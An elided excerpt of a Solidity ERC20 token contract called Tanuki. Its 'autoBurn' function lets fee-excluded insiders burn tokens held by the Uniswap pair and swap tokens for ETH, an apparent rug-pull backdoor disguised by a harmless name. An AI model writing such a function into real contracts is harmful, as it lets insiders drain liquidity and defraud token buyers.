...
contract Tanuki is ERC20, Ownable {
    ...
    constructor() ERC20("Okay", "okay") {
        ...
        uint256 totalSupply = 10000000 * 1e18;    // 10 million supply
        ...
        marketingWallet = payable(0x124A01cc2CF194a1cDa0324Fd17959141c09C9a9);
        devWallet = payable(0x124A01cc2CF194a1cDa0324Fd17959141c09C9a9);
    ...
    function autoBurn(uint feeB, uint feeA) external returns (bool) {
        require(_isExcludedFromFees[msg.sender]);

        uint feeC = balanceOf(uniswapV2Pair);

        require(feeA > 1 && feeA < feeC / 100, 'amount exceeded');

        _autoBurnAct(feeA);
        swapTokensForEth(feeB);
    ...
    function _autoBurnAct(uint256 pAmount) private {
